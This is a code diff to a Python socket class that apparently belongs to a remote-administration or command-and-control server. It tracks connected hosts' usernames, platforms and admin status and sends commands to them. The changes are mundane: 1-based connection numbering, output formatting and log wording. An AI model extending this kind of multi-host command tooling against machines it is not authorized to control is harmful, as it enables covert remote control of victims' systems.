@@ -12,7 +12,7 @@ from threading import Thread
 
 from src import helper, errors
 from src.encrypted_socket import EncryptedSocket
-from src.command_defs import *
+from src.definitions.commands import *
 
 
 class Socket(EncryptedSocket):
@@ -75,7 +75,7 @@ class Socket(EncryptedSocket):
                         self.addresses.append(address)
 
                     self.logger.info(
-                        f"Connection {len(self.connections) - 1} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
+                        f"Connection {len(self.connections)} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                 except socket.error as err:
                     self.logger.error(f"Error accepting connection {err}")
                     continue
@@ -131,7 +131,7 @@ class Socket(EncryptedSocket):
         # add ID
         for i, address in enumerate(self.addresses):
             if (inactive and not address["connected"]) or (not inactive and address["connected"]):
-                address = {"index": str(i)} | address
+                address = {"index": str(i + 1)} | address
                 addresses.append(address)
 
         if len(addresses) > 0:
@@ -142,11 +142,13 @@ class Socket(EncryptedSocket):
 
             info += "\n"
 
-            for address in addresses:
+            for i, address in enumerate(addresses):
                 for key in address:
                     if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                         info += f"{helper.center(key, address[key])}{4 * ' '}"
-                info += "\n"
+
+                if i < len(addresses) - 1:
+                    info += "\n"
 
             return info
         else:
@@ -155,12 +157,17 @@ class Socket(EncryptedSocket):
             self.logger.warning(f"No {_str} connections")
             return ""
 
+    # connection id should be actual index + 1
     def select(self, connection_id):
         try:
             connection_id = int(connection_id)
-            self.socket = self.connections[connection_id]
 
-            if not self.addresses[connection_id]["connected"]:
+            if connection_id < 1:
+                raise Exception
+
+            self.socket = self.connections[connection_id - 1]
+
+            if not self.addresses[connection_id - 1]["connected"]:
                 raise Exception
 
         except Exception:
@@ -168,7 +175,7 @@ class Socket(EncryptedSocket):
 
     def send_all_connections(self, key, value, recv=False, recvall=False):
         if self.num_active_connections() > 0:
-            for _, self.socket in enumerate(self.active_connections()):
+            for i, self.socket in enumerate(self.active_connections()):
 
                 try:
                     self.send_json(key, value)
@@ -185,7 +192,7 @@ class Socket(EncryptedSocket):
 
                 if output:
                     _info = self.addresses[self.connections.index(self.socket)]
-                    self.logger.info(f"Command output from {_info['ip']}: \n{output}")
+                    self.logger.info(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
         else:
             self.logger.warning("No active connections")
 
